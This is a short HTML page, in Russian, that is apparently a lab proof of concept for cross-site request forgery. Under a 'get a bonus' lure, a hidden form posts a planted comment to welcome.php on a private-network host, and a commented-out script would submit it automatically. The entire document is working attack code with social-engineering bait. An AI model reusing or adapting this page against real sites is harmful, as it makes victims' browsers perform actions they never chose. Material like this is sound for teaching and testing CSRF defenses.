<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Вредоносная CSRF-форма</title>
</head>
<body>
    <h1>Нажмите, чтобы получить бонус!</h1>
    <form action="http://192.168.56.102/welcome.php" method="POST">
        <input type="hidden" name="comment" value="Это CSRF-атакующий комментарий!">
        <button type="submit">Получить бонус</button>
    </form>
    <!-- <script>
        // Автоматическая отправка формы без участия пользователя
        document.forms[0].submit();
    </script> -->
</body>
</html>
